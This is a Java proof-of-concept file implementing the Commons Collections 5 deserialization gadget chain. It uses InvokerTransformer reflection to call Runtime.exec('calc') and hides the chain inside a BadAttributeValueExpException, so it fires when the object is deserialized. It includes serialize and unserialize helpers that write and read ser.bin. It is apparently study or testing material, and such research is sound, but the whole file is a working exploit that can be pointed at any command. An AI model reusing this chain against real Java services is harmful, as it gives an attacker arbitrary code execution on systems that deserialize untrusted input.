import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class cc5 {
    public static void main(String[] args) throws NoSuchFieldException, IOException, ClassNotFoundException, IllegalAccessException {
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
//        Runtime runtime = Runtime.getRuntime();
//        InvokerTransformer invoke = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        Map<Object,Object> hash = new HashMap<Object, Object>();
        Map decorate = LazyMap.decorate(hash,chainedTransformer);
        TiedMapEntry tied = new TiedMapEntry(decorate, "aaa");
//        tied.toString();

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(new ConstantTransformer(1));

        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,tied);
//        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);

    }
    public static Object unserialize(String name) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(name));
        Object o1 = objectInputStream.readObject();
        return o1;
    }
}
